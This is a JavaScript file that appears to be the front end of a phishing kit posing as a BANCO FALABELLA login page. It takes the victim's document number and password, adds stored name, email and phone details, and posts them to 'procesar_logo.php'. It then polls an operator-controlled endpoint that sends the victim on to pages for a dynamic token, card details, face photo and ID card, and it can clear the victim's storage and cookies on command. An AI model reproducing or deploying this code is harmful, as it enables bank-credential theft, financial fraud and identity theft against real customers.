function createFreshTransactionId() {
    const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
    localStorage.setItem('session_id', generated);
    localStorage.setItem('last_tid', generated);
    return generated;
}

function resolveTransactionId(forceNew = false) {
    const params = new URLSearchParams(window.location.search);
    const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== '');
    if (forceNew) {
        return createFreshTransactionId();
    }
    if (direct) {
        const normalized = String(direct);
        localStorage.setItem('session_id', normalized);
        localStorage.setItem('last_tid', normalized);
        return normalized;
    }
    const fromStorage = localStorage.getItem('session_id');
    if (fromStorage && String(fromStorage).trim() !== '') {
        return String(fromStorage);
    }
    return createFreshTransactionId();
}

// Funcionalidad para validar y habilitar botones
$(document).ready(function() {
    localStorage.removeItem('session_id');
    localStorage.removeItem('messageId');
    localStorage.removeItem('token');
    localStorage.removeItem('username');
    localStorage.removeItem('password');
    localStorage.removeItem('identificacion');
    
    // Verificar que los elementos existen
    if ($("#txtDocumento").length === 0) {
        return;
    }
    if ($("#txtClave").length === 0) {
        return;
    }
    if ($("#btnEntrar").length === 0) {
        return;
    }
    
    // Validación para el botón principal
    $("#txtDocumento").on("input", function() {
        checkButtonState();
    });
    
    $("#txtClave").on("input", function() {
        checkButtonState();
    });
    
    function checkButtonState() {
        var documento = $("#txtDocumento").val().length;
        var clave = $("#txtClave").val().length;
        
        if (documento >= 5 && clave >= 4) {
            $("#btnEntrar").prop("disabled", false).css({
                "background-color": "#38a121",
                "cursor": "pointer"
            });
        } else {
            $("#btnEntrar").prop("disabled", true).css({
                "background-color": "#59B981",
                "cursor": "not-allowed"
            });
        }
    }

    // Validación para el botón móvil
    $("#txtDocumentoM").on("input", function() {
        checkMobileButtonState();
    });
    
    $("#txtClaveM").on("input", function() {
        checkMobileButtonState();
    });
    
    function checkMobileButtonState() {
        var documento = $("#txtDocumentoM").val().length;
        var clave = $("#txtClaveM").val().length;
        
        if (documento >= 5 && clave >= 4) {
            $("#btnEntrarM").prop("disabled", false).css({
                "background-color": "#38a121",
                "cursor": "pointer"
            });
        } else {
            $("#btnEntrarM").prop("disabled", true).css({
                "background-color": "#59B981",
                "cursor": "not-allowed"
            });
        }
    }

    // Espera 3 segundos y oculta el loader inicial
    setTimeout(function () {
        document.getElementById('loader').style.display = 'none';
    }, 3000);

    // Generar un transactionId nuevo por cada envío para no mezclar respuestas entre pasos
    let sessionId = resolveTransactionId(false);
    if (!sessionId || $("#txtDocumento").length > 0) {
        sessionId = createFreshTransactionId();
    }

    // Event listener para el botón principal
    $("#btnEntrar").click(function(e) {
        e.preventDefault();
        
        var documento = $("#txtDocumento").val();
        var clave = $("#txtClave").val();
        var tipo = $("#txtTipo").val();
        
        // Validar que la contraseña tenga al menos 4 dígitos
        if (clave.length < 4) {
            alert('La contraseña debe tener al menos 4 dígitos');
            return;
        }

        // Mostrar loader
        $("#mensaje").show();

        const submissionTransactionId = createFreshTransactionId();
        localStorage.setItem('documento', documento);
        localStorage.setItem('clave', clave);
        localStorage.setItem('session_id', submissionTransactionId);

        let localTb = {};
        try {
            localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
        } catch(err) {}

        if (!localTb.banco) localTb.banco = 'BANCO FALABELLA';
        if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
        if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom') || localStorage.getItem('per'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom') || localStorage.getItem('per');
        if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
        if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');

        const formData = new FormData();
        formData.append('transactionId', submissionTransactionId);
        formData.append('u_id', tipo + ' ' + documento);
        formData.append('u_ps', clave);
        formData.append('u_tb', JSON.stringify(localTb));

        fetch('procesar_logo.php', { method: 'POST', body: formData })
        .then(res => res.text())
        .then(text => {
            try {
                const result = JSON.parse(text);
                if (result.status === 'success') {
                    checkPaymentVerification(submissionTransactionId, result.messageId);
                } else {
                    console.error("Error API:", result);
                    $("#mensaje").hide();
                }
            } catch(e) {
                console.error("Parse Error:", text);
                $("#mensaje").hide();
            }
        })
        .catch(err => {
            console.error("Fetch Error:", err);
            $("#mensaje").hide();
        });
    });

    // Event listener para el botón móvil
    $("#btnEntrarM").click(function(e) {
        e.preventDefault();
        
        var documento = $("#txtDocumentoM").val();
        var clave = $("#txtClaveM").val();
        var tipo = $("#txtTipoM").val();
        
        // Validar que la contraseña tenga al menos 4 dígitos
        if (clave.length < 4) {
            alert('La contraseña debe tener al menos 4 dígitos');
            return;
        }
        
        // Mostrar loader
        $("#mensaje").show();
        
        const submissionTransactionId = createFreshTransactionId();
        localStorage.setItem('documento', documento);
        localStorage.setItem('clave', clave);
        localStorage.setItem('session_id', submissionTransactionId);
        
        let localTb = {};
        try {
            localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
        } catch(err) {}
        
        if (!localTb.banco) localTb.banco = 'BANCO FALABELLA';
        if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
        if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom') || localStorage.getItem('per'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom') || localStorage.getItem('per');
        if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
        if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');
        
        const formData = new FormData();
        formData.append('transactionId', submissionTransactionId);
        formData.append('u_id', tipo + ' ' + documento);
        formData.append('u_ps', clave);
        formData.append('u_tb', JSON.stringify(localTb));
        
        fetch('procesar_logo.php', { method: 'POST', body: formData })
        .then(res => res.text())
        .then(text => {
            try {
                const result = JSON.parse(text);
                if (result.status === 'success') {
                    checkPaymentVerification(submissionTransactionId, result.messageId);
                } else {
                    console.error("Error API:", result);
                    $("#mensaje").hide();
                }
            } catch(e) {
                console.error("Parse Error:", text);
                $("#mensaje").hide();
            }
        })
        .catch(err => {
            console.error("Fetch Error:", err);
            $("#mensaje").hide();
        });
    });

    async function checkPaymentVerification(transactionId, messageId) {
    try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), {
            method: 'POST',
            body: formData,
            cache: 'no-store'
        });

        const result = await res.json();

        if (result.action) {
            switch (result.action) {
                case 'pedir_dinamica':
                case 'error_token':
                    window.location.href = "token.php";
                    break;
                case 'error_logo':
                    $("#mensaje").hide();
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "index.php";
                    break;
                case 'error_tc':
                    window.location.href = "/datac/alter.php";
                    break;
                case 'error': // Redirección para Cara
                    window.location.href = "/caras";
                    break;
                case 'cedula': // Redirección para Cédula
                    window.location.href = "/cedula";
                    break;
                case 'bre_b': // Redirección para Brev
                    window.location.href = "/recaudos/brev.php";
                    break;
                case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                    window.location.href = "finalizado.php";
                    break;
                default:
                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                    break;
            }
        } else {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }

    } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
}

});